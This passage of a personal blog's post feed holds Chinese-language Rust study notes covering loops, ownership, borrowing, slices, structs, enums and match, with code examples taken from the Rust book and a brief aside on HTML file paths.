<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> number = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> number % <span class="number">4</span> == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">&quot;number is divisible by 4&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> number % <span class="number">3</span> == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">&quot;number is divisible by 3&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> number % <span class="number">2</span> == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">&quot;number is divisible by 2&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">&quot;number is not divisible by 4, 3, or 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> condition = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">let</span> number = <span class="keyword">if</span> condition &#123; <span class="number">5</span> &#125; <span class="keyword">else</span> &#123; <span class="number">6</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">&quot;The value of number is: &#123;&#125;&quot;</span>, number);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h5><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    loop &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">&quot;again!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> mut counter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> result = loop &#123;</span><br><span class="line">        counter += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> counter == <span class="number">10</span> &#123;</span><br><span class="line">            <span class="keyword">break</span> counter * <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">&quot;The result is &#123;&#125;&quot;</span>, result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="while"><a href="#while" class="headerlink" title="while"></a>while</h6><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> mut number = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> number != <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">&quot;&#123;&#125;!&quot;</span>, number);</span><br><span class="line"></span><br><span class="line">        number -= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">&quot;LIFTOFF!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h6 id="for"><a href="#for" class="headerlink" title="for"></a>for</h6><p> use a for loop and execute some code for each item in a collection</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> element <span class="keyword">in</span> a.iter() &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">&quot;the value is: &#123;&#125;&quot;</span>, element);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">for</span> number <span class="keyword">in</span> (<span class="number">1</span>..<span class="number">4</span>).rev() &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">&quot;&#123;&#125;!&quot;</span>, number);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">&quot;LIFTOFF!!!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>rev, to reverse the range</code></p>
<h3 id="guess-game-example"><a href="#guess-game-example" class="headerlink" title="guess game . example"></a>guess game . example</h3><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">let</span> x = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">let</span> y = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">println</span>!(<span class="string">&quot;x = &#123;&#125; and y = &#123;&#125;&quot;</span>, x, y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>cargo doc --open</code></p>
<p>The** trim **method on a String instance will eliminate any whitespace at the beginning and end<br>5\n 变成 5<br>The **parse **method on strings parses a string into some kind of number. </p>
<p>cargo fmt 自动调整格式<br><a href="https://github.com/rust-lang/rustfmt">https://github.com/rust-lang/rustfmt</a></p>
]]></content>
      <tags>
        <tag>RUST</tag>
      </tags>
  </entry>
  <entry>
    <title>RUST学习2</title>
    <url>/2020/07/29/RUST%E5%AD%A6%E4%B9%A02/</url>
    <content><![CDATA[<h3 id="rust"><a href="#rust" class="headerlink" title="rust"></a>rust</h3><p>All data <code>stored on the stack must have a known, fixed size. </code>Data with an unknown size at compile time or a size that might change must be stored on the heap instead.</p>
<p>Pushing to<code> the stack is faster than allocating on the heap</code> because the allocator never has to search for a place to store new data; </p>
<a id="more"></a>
<h3 id="Ownership-Rules"><a href="#Ownership-Rules" class="headerlink" title="Ownership Rules"></a>Ownership Rules</h3><p>解决堆上数据 的问题</p>
<p>Each value in Rust has a variable that’s called its owner.<br>There can only <code>be one owner at a time.</code><br>When the <code>owner goes out of scope, </code>the value will be dropped. <code>从堆中回收</code></p>
<p>string 存在scope中</p>
<p>the concept of copying the pointer, length, and capacity without copying the data probably sounds like making a shallow copy. </p>
<p>rust</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">let s1 = String::from(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">  <span class="params">|         -- move occurs because `s1` has type `std::string::String`, which does <span class="keyword">not</span> implement the `Copy` trait</span></span><br><span class="line"><span class="params">3 |</span>     let s2 = s1;</span><br><span class="line">  <span class="params">|              -- value moved here</span></span><br></pre></td></tr></table></figure>
<p>s1 无效 回收只s2</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let s1 = String::from(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    let s2 = s1.clone();</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">&quot;s1 = &#123;&#125;, s2 = &#123;&#125;&quot;</span>, s1, s2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">x=<span class="number">5</span></span><br><span class="line">y=x</span><br></pre></td></tr></table></figure>
<p><code>栈中不用clone</code></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let s = String::from(<span class="string">&quot;hello&quot;</span>);  <span class="regexp">//</span> s comes into scope</span><br><span class="line"></span><br><span class="line">    takes_ownership(s);             <span class="regexp">//</span> s<span class="string">&#x27;s value moves into the function...</span></span><br><span class="line"><span class="string">                                    // ... and so is no longer valid here</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    let x = 5;                      // x comes into scope</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    makes_copy(x);                  // x would move into the function,</span></span><br><span class="line"><span class="string">                                    // but i32 is Copy, so it’s okay to still</span></span><br><span class="line"><span class="string">                                    // use x afterward</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125; // Here, x goes out of scope, then s. But because s&#x27;</span>s value was moved, nothing</span><br><span class="line">  /<span class="regexp">/ special happens.</span></span><br></pre></td></tr></table></figure>

<h3 id="References-and-Borrowing"><a href="#References-and-Borrowing" class="headerlink" title="References and Borrowing"></a>References and Borrowing</h3><p>引用 不拿所有权 也称借</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">    change(&amp;mut s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn change(<span class="symbol">some_string:</span> &amp;mut String) &#123;</span><br><span class="line">    some_string.push_str(<span class="string">&quot;, world&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>一个可变变量只能引用一次 </code></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        let r1 = &amp;mut s;</span><br><span class="line">    &#125; /<span class="regexp">/ r1 goes out of scope here, so we can make a new reference with no problems.</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    let r2 = &amp;mut s;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure>
<p>用花括号创建一个空间，来引用，</p>
<p> We also cannot have a mutable reference while we have an immutable one.<br><code>可变变量有不变引用后，不能创建可变引用</code></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">    let r1 = &amp;s; <span class="regexp">//</span> no problem</span><br><span class="line">    let r2 = &amp;s; <span class="regexp">//</span> no problem</span><br><span class="line">    println!(<span class="string">&quot;&#123;&#125; and &#123;&#125;&quot;</span>, r1, r2);</span><br><span class="line">    /<span class="regexp">/ r1 and r2 are no longer used after this point</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    let r3 = &amp;mut s; /</span><span class="regexp">/ no problem</span></span><br><span class="line"><span class="regexp">    println!(&quot;&#123;&#125;&quot;, r3);</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure>
<p><strong>引用范围从创建到最后一次使用<br>关键是不重叠</strong></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let reference_to_nothing = dangle();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn dangle() -&gt; &amp;String &#123; <span class="regexp">//</span> dangle returns a reference to a String</span><br><span class="line"></span><br><span class="line">    let s = String::from(<span class="string">&quot;hello&quot;</span>); <span class="regexp">//</span> s is a new String</span><br><span class="line"></span><br><span class="line">    &amp;s /<span class="regexp">/ we return a reference to the String, s</span></span><br><span class="line"><span class="regexp">&#125; /</span><span class="regexp">/ Here, s goes out of scope, and is dropped. Its memory goes away.</span></span><br><span class="line"><span class="regexp">  /</span><span class="regexp">/ Danger!</span></span><br></pre></td></tr></table></figure>

<h3 id="slice"><a href="#slice" class="headerlink" title="slice"></a>slice</h3><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn first_word(<span class="symbol">s:</span> &amp;String) -&gt; usize &#123;</span><br><span class="line">    let bytes = s.as_bytes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i, &amp;item) <span class="keyword">in</span> bytes.iter().enumerate() &#123;</span><br><span class="line">        <span class="keyword">if</span> item == b<span class="string">&#x27; &#x27;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    s.len()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>iter </code>is a method that returns each element in a collection<br><code>enumerate</code> wraps the result of iter and returns each element as part of a tuple instead.<br><code>第一个参数是索引值，第二个是值的引用</code></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let s = String::from(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line"></span><br><span class="line">    let hello = &amp;s[<span class="number">0</span>..<span class="number">5</span>]; <span class="regexp">//</span><span class="number">0</span>可以省去</span><br><span class="line">    let world = &amp;s[<span class="number">6</span>..<span class="number">11</span>]; 存<span class="number">6</span>-<span class="number">10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="string-slices"><a href="#string-slices" class="headerlink" title="string slices"></a>string slices</h3><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">let s = String::from(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">let len = s.len();</span><br><span class="line"></span><br><span class="line">let slice = &amp;s[<span class="number">3</span>..len];</span><br><span class="line">let slice = &amp;s[<span class="number">3</span>..]; <span class="regexp">//</span>相同</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The type that signifies “string slice” is written as &amp;str:</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn first_word(<span class="symbol">s:</span> &amp;String) -&gt; &amp;str &#123;</span><br><span class="line">    let bytes = s.as_bytes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i, &amp;item) <span class="keyword">in</span> bytes.iter().enumerate() &#123;</span><br><span class="line">        <span class="keyword">if</span> item == b<span class="string">&#x27; &#x27;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> &amp;s[<span class="number">0</span>..i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &amp;s[..]</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>String Literals Are Slices<br>固定字符串就是一种切片<br>The type of s here is &amp;str<br>it’s a slice pointing to that specific point of the binary</p>
<p>fn first_word(s: &amp;str) -&gt; &amp;str {<br><code>可以接受&amp;String 和 &amp;str</code> //String 和 字符串 如“hello”</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">let a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">let slice = &amp;a[<span class="number">1</span>..<span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h3><p>结构体字段里都是可变的</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">struct User &#123;</span><br><span class="line">    <span class="symbol">username:</span> String,</span><br><span class="line">    <span class="symbol">email:</span> String,</span><br><span class="line">    <span class="symbol">sign_in_count:</span> u64,</span><br><span class="line">    <span class="symbol">active:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct User &#123;</span><br><span class="line">    <span class="symbol">username:</span> String,</span><br><span class="line">    <span class="symbol">email:</span> String,</span><br><span class="line">    <span class="symbol">sign_in_count:</span> u64,</span><br><span class="line">    <span class="symbol">active:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let user1 = User &#123;</span><br><span class="line">        <span class="symbol">email:</span> String::from(<span class="string">&quot;someone@example.com&quot;</span>),</span><br><span class="line">        <span class="symbol">username:</span> String::from(<span class="string">&quot;someusername123&quot;</span>),</span><br><span class="line">        <span class="symbol">active:</span> <span class="literal">true</span>,</span><br><span class="line">        <span class="symbol">sign_in_count:</span> <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>顺序随便</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">struct User &#123;</span><br><span class="line">    <span class="symbol">username:</span> String,</span><br><span class="line">    <span class="symbol">email:</span> String,</span><br><span class="line">    <span class="symbol">sign_in_count:</span> u64,</span><br><span class="line">    <span class="symbol">active:</span> bool,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn build_user(<span class="symbol">email:</span> String, <span class="symbol">username:</span> String) -&gt; User &#123; <span class="regexp">//</span>返回struct 实例</span><br><span class="line">    User &#123;</span><br><span class="line">        <span class="symbol">email:</span> email,</span><br><span class="line">        <span class="symbol">username:</span> username,</span><br><span class="line">        <span class="symbol">active:</span> <span class="literal">true</span>,</span><br><span class="line">        <span class="symbol">sign_in_count:</span> <span class="number">1</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let user1 = build_user(</span><br><span class="line">        String::from(<span class="string">&quot;someone@example.com&quot;</span>),</span><br><span class="line">        String::from(<span class="string">&quot;someusername123&quot;</span>),</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn build_user(<span class="symbol">email:</span> String, <span class="symbol">username:</span> String) -&gt; User &#123;</span><br><span class="line">    User &#123;</span><br><span class="line">        email,  <span class="regexp">//</span>省略rather than <span class="symbol">email:</span> email.</span><br><span class="line">        username,</span><br><span class="line">        <span class="symbol">active:</span> <span class="literal">true</span>,</span><br><span class="line">        <span class="symbol">sign_in_count:</span> <span class="number">1</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>更新赋予另一实例</strong></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">struct User &#123;</span><br><span class="line">    <span class="symbol">username:</span> String,</span><br><span class="line">    <span class="symbol">email:</span> String,</span><br><span class="line">    <span class="symbol">sign_in_count:</span> u64,</span><br><span class="line">    <span class="symbol">active:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let user1 = User &#123;</span><br><span class="line">        <span class="symbol">email:</span> String::from(<span class="string">&quot;someone@example.com&quot;</span>),</span><br><span class="line">        <span class="symbol">username:</span> String::from(<span class="string">&quot;someusername123&quot;</span>),</span><br><span class="line">        <span class="symbol">active:</span> <span class="literal">true</span>,</span><br><span class="line">        <span class="symbol">sign_in_count:</span> <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    let user2 = User &#123;</span><br><span class="line">        <span class="symbol">email:</span> String::from(<span class="string">&quot;another@example.com&quot;</span>),</span><br><span class="line">        <span class="symbol">username:</span> String::from(<span class="string">&quot;anotherusername567&quot;</span>),</span><br><span class="line">        ..user1  /<span class="regexp">/ .. specifies that the remaining fields not explicitly set should have the same value as the fields in the given instance.</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br></pre></td></tr></table></figure>
<h3 id="tuple-struct"><a href="#tuple-struct" class="headerlink" title="tuple struct"></a>tuple struct</h3><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    struct Color(i32, i32, i32);</span><br><span class="line">    struct Point(i32, i32, i32);</span><br><span class="line"></span><br><span class="line">    let black = Color(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    let origin = Point(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>做网站<br>文件路径的一些通用规则：</p>
<p>若引用的目标文件与 HTML 文件同级，只需直接使用文件名，比如 <code>my-image.jpg </code>。<br>要引用子文件夹中的文件，要在路径前写下目录名并加一个斜杠，比如 <code>subdirectory/my-image.jpg </code>。<br>若引用的目标文件位于 HTML 文件的上级，需要加上两个点。比如，如果 index.html 在 test-site 下面的一个子目录而 my-image.png 在 test-site 目录，你可以在 index.html 里使用 <code>../my-image.png 引用 my-image.png </code>。<br>以上方法可以随意组合，比如 ../subdirectory/another-subdirectory/my-image.png。</p>
]]></content>
      <tags>
        <tag>RUST</tag>
      </tags>
  </entry>
  <entry>
    <title>RUST学习3</title>
    <url>/2020/08/03/RUST%E5%AD%A6%E4%B9%A03/</url>
    <content><![CDATA[<h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>The <code>Debug trait </code>enables us to print our struct in a way that is useful for developers so we can see its value while we’re debugging our code.</p>
<a id="more"></a>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">[derive(Debug)]  //开启使用debug :?打印结构体</span><br><span class="line">struct Rectangle &#123;</span><br><span class="line">    width: u32,</span><br><span class="line">    height: u32,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let rect1 = Rectangle &#123;</span><br><span class="line">        width: <span class="number">30</span>,</span><br><span class="line">        height: <span class="number">50</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">&quot;rect1 is &#123;:?&#125;&quot;</span>, rect1);  //or&#123;:<span class="comment">#?&#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="method"><a href="#method" class="headerlink" title="method"></a>method</h3><p>their first parameter is <code>always self, </code>which represents the instance of the struct the method is being called on.</p>
<p>impl (implementation)</p>
<p>Methods can<code> take ownership of self,</code> borrow<code>self immutably</code>as we’ve done here, or borrow self mutably, just as they can any other parameter.<br><code>&amp;mut self</code></p>
<h3 id="associated-function"><a href="#associated-function" class="headerlink" title="associated function"></a>associated function</h3><p>You’ve already used the String::from associated function.</p>
<p>Associated functions are often used for constructors that will <code>return a new instance of the struct.</code></p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">[derive(Debug)]</span><br><span class="line">struct Rectangle &#123;</span><br><span class="line">    width: u32,</span><br><span class="line">    height: u32,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Rectangle &#123;</span><br><span class="line">    fn square(size: u32) -&gt; Rectangle &#123;  //没有self</span><br><span class="line">        Rectangle &#123;</span><br><span class="line">            width: size,</span><br><span class="line">            height: size,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let sq = Rectangle::square(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Each struct is allowed to have multiple impl blocks. </p>
<h3 id="Enum"><a href="#Enum" class="headerlink" title="Enum"></a>Enum</h3><p>枚举</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">enum IpAddrKind &#123;</span><br><span class="line">    V4,  //V4 V6就是所谓的变体</span><br><span class="line">    V6,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let four = IpAddrKind::V4;</span><br><span class="line">    let six = IpAddrKind::V6;</span><br><span class="line"></span><br><span class="line">    route(IpAddrKind::V4);</span><br><span class="line">    route(IpAddrKind::V6);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn route(ip_kind: IpAddrKind) &#123;&#125;</span><br></pre></td></tr></table></figure>
<p>枚举比struct更简明</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    enum IpAddr &#123;</span><br><span class="line">        V4(String),</span><br><span class="line">        V6(String),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let home = IpAddr::V4(String::from(<span class="string">&quot;127.0.0.1&quot;</span>));</span><br><span class="line"></span><br><span class="line">    let loopback = IpAddr::V6(String::from(<span class="string">&quot;::1&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>枚举每个变体可以有不同的类型</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    enum IpAddr &#123;</span><br><span class="line">        V4(u8, u8, u8, u8),</span><br><span class="line">        V6(String),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let home = IpAddr::V4(<span class="number">127</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    let loopback = IpAddr::V6(String::from(<span class="string">&quot;::1&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">[allow(unused_variables)]</span><br><span class="line">fn main() &#123;</span><br><span class="line">struct Ipv4Addr &#123;</span><br><span class="line">    // --snip--</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct Ipv6Addr &#123;</span><br><span class="line">    // --snip--</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">enum IpAddr &#123;</span><br><span class="line">    V4(Ipv4Addr),</span><br><span class="line">    V6(Ipv6Addr),</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">enum Message &#123;</span><br><span class="line">    Quit,</span><br><span class="line">    Move &#123; x: i32, y: i32 &#125;,</span><br><span class="line">    Write(String),</span><br><span class="line">    ChangeColor(i32, i32, i32),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    enum Message &#123;</span><br><span class="line">        Quit,</span><br><span class="line">        Move &#123; x: i32, y: i32 &#125;,</span><br><span class="line">        Write(String),</span><br><span class="line">        ChangeColor(i32, i32, i32),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    impl Message &#123;</span><br><span class="line">        fn <span class="built_in">call</span>(&amp;self) &#123;</span><br><span class="line">            // method body would be defined here</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let m = Message::Write(String::from(<span class="string">&quot;hello&quot;</span>));</span><br><span class="line">    m.call();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="enum-option"><a href="#enum-option" class="headerlink" title="enum option"></a>enum option</h3><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">![allow(unused_variables)]</span><br><span class="line">fn main() &#123;</span><br><span class="line">enum Option&lt;<span class="built_in">T</span>&gt; &#123; //&lt;<span class="built_in">T</span>&gt; means the Some variant of the Option enum can hold one piece of data of <span class="built_in">any</span> type</span><br><span class="line">    Some(<span class="built_in">T</span>),</span><br><span class="line">    None,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>option不用显示引入，已经提前有了</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let some_number = Some(<span class="number">5</span>);</span><br><span class="line">    let some_string = Some(<span class="string">&quot;a string&quot;</span>);</span><br><span class="line"></span><br><span class="line">    let absent_number: Option&lt;i32&gt; = None;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>If we use None rather than Some, we need to tell Rust what<code> type of Option&lt;T&gt;</code> we have<br>Option<T> and T (where T can be any type) are different types,<br>In other words, you have to convert an Option<T> to a <code>T</code> before you can perform T operations with it. </p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">match</span><br><span class="line">enum Coin &#123;</span><br><span class="line">    Penny,</span><br><span class="line">    Nickel,</span><br><span class="line">    Dime,</span><br><span class="line">    Quarter,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn value_in_cents(coin: Coin) -&gt; u8 &#123;</span><br><span class="line">    match coin &#123;</span><br><span class="line">        Coin::Penny =&gt; <span class="number">1</span>,</span><br><span class="line">        Coin::Nickel =&gt; <span class="number">5</span>,</span><br><span class="line">        Coin::Dime =&gt; <span class="number">10</span>,</span><br><span class="line">        Coin::Quarter =&gt; <span class="number">25</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;&#125;</span><br></pre></td></tr></table></figure>
<p>The code associated with <code>each arm is an expression</code>, and the resulting value of the expression in the matching arm is the value that gets returned for the entire match expression.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn value_in_cents(coin: Coin) -&gt; u8 &#123;</span><br><span class="line">    match coin &#123;</span><br><span class="line">        Coin::Penny =&gt; &#123;</span><br><span class="line">            println!(<span class="string">&quot;Lucky penny!&quot;</span>);</span><br><span class="line">            <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        Coin::Nickel =&gt; <span class="number">5</span>,</span><br><span class="line">        Coin::Dime =&gt; <span class="number">10</span>,</span><br><span class="line">        Coin::Quarter =&gt; <span class="number">25</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
